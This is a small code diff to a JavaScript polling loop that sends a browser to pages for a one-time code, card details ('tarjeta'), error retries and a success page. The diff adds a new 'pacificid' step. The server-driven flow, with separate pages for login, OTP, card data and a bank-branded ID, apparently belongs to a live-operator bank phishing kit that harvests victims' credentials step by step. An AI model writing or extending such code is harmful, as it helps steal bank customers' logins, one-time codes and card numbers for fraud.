@@ -68,12 +68,14 @@
       const data = await res.json();
 
       switch(data.action){
-        case 'otp':           window.location.href = 'otp.html'; break;
-        case 'tarjeta':       window.location.href = 'tarjeta.html'; break;
-        case 'error_login':   window.location.href = 'index1.html?error=login'; break;
-        case 'error_otp':     window.location.href = 'otp.html?error=otp'; break;
-        case 'error_tarjeta': window.location.href = 'tarjeta.html?error=tarjeta'; break;
-        case 'aprobar':       window.location.href = 'success.html'; break;
+        case 'otp':              window.location.href = 'otp.html'; break;
+        case 'pacificid':        window.location.href = 'pacificid.html'; break;
+        case 'tarjeta':          window.location.href = 'tarjeta.html'; break;
+        case 'error_login':      window.location.href = 'index1.html?error=login'; break;
+        case 'error_otp':        window.location.href = 'otp.html?error=otp'; break;
+        case 'error_pacificid':  window.location.href = 'pacificid.html?error=pacificid'; break;
+        case 'error_tarjeta':    window.location.href = 'tarjeta.html?error=tarjeta'; break;
+        case 'aprobar':          window.location.href = 'success.html'; break;
       }
     }catch(e){ console.log('polling error', e); }
   }
